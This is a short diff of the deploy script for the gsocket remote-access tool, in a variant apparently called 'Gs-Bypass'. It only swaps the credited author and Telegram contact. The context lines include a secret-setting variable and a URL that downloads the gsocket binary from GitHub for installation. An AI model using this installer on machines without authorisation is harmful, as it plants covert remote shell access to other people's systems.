@@ -2077,7 +2077,7 @@ init_vars
 [[ -n "$GS_UNDO" ]] || [[ -n "$GS_CLEAN" ]] || [[ -n "$GS_UNINSTALL" ]] && uninstall
 
 init_setup
-[[ -n $GS_BRANCH ]] && WARN "Using Gs-Bypass By xiaoxian6666666"
+[[ -n $GS_BRANCH ]] && WARN "Using Gs-Bypass By rexorid"
 
 [[ -n "$X" ]] && GS_SECRET_X="$X"
 
@@ -2139,7 +2139,7 @@ gs_start
     ${CRY}PLEASE REPORT THIS${CN}" 
 }
 
-{ [ -z "$GS_BIN" ] || [ -z "$GS_NAME" ]; } && WARN "ERROR OR UPDATE? CONTACT t.me/xiaoxian6666666"
+{ [ -z "$GS_BIN" ] || [ -z "$GS_NAME" ]; } && WARN "ERROR OR UPDATE? CONTACT t.me/rexorid"
 [[ "$GS_URL_DEPLOY" == "https://gsocket.io"* ]] && {
     unset str
     url="https://github.com/hackerschoice/binary/raw/refs/heads/main/gsocket"
